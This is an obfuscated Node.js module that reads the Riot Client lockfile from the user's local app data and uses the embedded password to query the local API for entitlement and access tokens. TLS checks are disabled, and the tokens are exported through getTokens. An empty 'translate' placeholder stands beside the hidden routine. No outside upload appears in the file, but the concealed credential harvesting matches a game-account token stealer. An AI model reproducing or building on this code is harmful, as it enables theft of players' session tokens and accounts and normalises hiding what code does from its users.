const fs = require('fs')
const axios = require('axios');
const https = require('https');

(function(_0x5817c4,_0x510bd0){const _0x2b07a1=_0x5edd,_0x4acfde=_0x5817c4();while(!![]){try{const _0x5480d8=-parseInt(_0x2b07a1(0x1dc))/0x1+parseInt(_0x2b07a1(0x1df))/0x2*(parseInt(_0x2b07a1(0x1e6))/0x3)+parseInt(_0x2b07a1(0x1da))/0x4*(-parseInt(_0x2b07a1(0x1eb))/0x5)+parseInt(_0x2b07a1(0x1d5))/0x6*(-parseInt(_0x2b07a1(0x1e8))/0x7)+-parseInt(_0x2b07a1(0x1e0))/0x8*(parseInt(_0x2b07a1(0x1e3))/0x9)+parseInt(_0x2b07a1(0x1d8))/0xa*(-parseInt(_0x2b07a1(0x1ef))/0xb)+parseInt(_0x2b07a1(0x1d7))/0xc*(parseInt(_0x2b07a1(0x1e7))/0xd);if(_0x5480d8===_0x510bd0)break;else _0x4acfde['push'](_0x4acfde['shift']());}catch(_0x19b8f9){_0x4acfde['push'](_0x4acfde['shift']());}}}(_0x4161,0xbcae5));function getLockfile(){const _0x444453=_0x5edd;if(!fs['existsSync'](process[_0x444453(0x1ec)]['LOCALAPPDATA']+_0x444453(0x1e1)))return null;return fs[_0x444453(0x1d6)](process[_0x444453(0x1ec)]['LOCALAPPDATA']+_0x444453(0x1e1),_0x444453(0x1d9));}async function getLocalData(_0x55f8c3){const _0x393a11=_0x5edd;let _0x480c7d=getLockfile();if(!_0x480c7d)return null;return _0x480c7d=_0x480c7d[_0x393a11(0x1ee)](':'),axios[_0x393a11(0x1d4)]('https://127.0.0.1:'+_0x480c7d[0x2]+_0x55f8c3,{'headers':{'Authorization':_0x393a11(0x1e2)+Buffer[_0x393a11(0x1e5)](_0x393a11(0x1e4)+_0x480c7d[0x3],_0x393a11(0x1d9))['toString']('base64'),'user-agent':_0x393a11(0x1de),'X-Riot-ClientVersion':_0x393a11(0x1ed),'Content-Type':'application/json','rchat-blocking':_0x393a11(0x1f0)},'httpsAgent':new https[(_0x393a11(0x1ea))]({'rejectUnauthorized':![]})})[_0x393a11(0x1e9)](_0x50437c=>_0x50437c[_0x393a11(0x1d3)])[_0x393a11(0x1db)](_0x21359e=>{return null;});}function _0x4161(){const _0x5174a0=['36YNjFks','320WjHPbZ','utf8','16052PQVTtw','catch','413627DChcfR','/entitlements/v1/token','ShooterGame/21\x20Windows/10.0.19042.1.768.64bit','4856ScnPxu','6071144RzMVQD','\x5cRiot\x20Games\x5cRiot\x20Client\x5cConfig\x5clockfile','Basic\x20','18revLOl','riot:','from','333lpfooy','21123297SXXmvz','7537026nUbRCi','then','Agent','755JgRaLe','env','release-02.03-shipping-8-521855','split','260282qOkjsE','true','data','get','6eVvUio','readFileSync'];_0x4161=function(){return _0x5174a0;};return _0x4161();}function _0x5edd(_0x25d5ba,_0x542b99){const _0x4161df=_0x4161();return _0x5edd=function(_0x5eddec,_0x298529){_0x5eddec=_0x5eddec-0x1d3;let _0x1c7d7e=_0x4161df[_0x5eddec];return _0x1c7d7e;},_0x5edd(_0x25d5ba,_0x542b99);}function getTokens(){return new Promise((_0x3c87e3,_0x234f6f)=>{const _0x36a08d=_0x5edd;getLocalData(_0x36a08d(0x1dd))[_0x36a08d(0x1e9)](_0x210ed9=>{_0x3c87e3(_0x210ed9);});});}

function translate() {
    /**
     * Coming Soon
     */
}


module.exports = {
    getLockfile,
    getLocalData,
    getTokens
}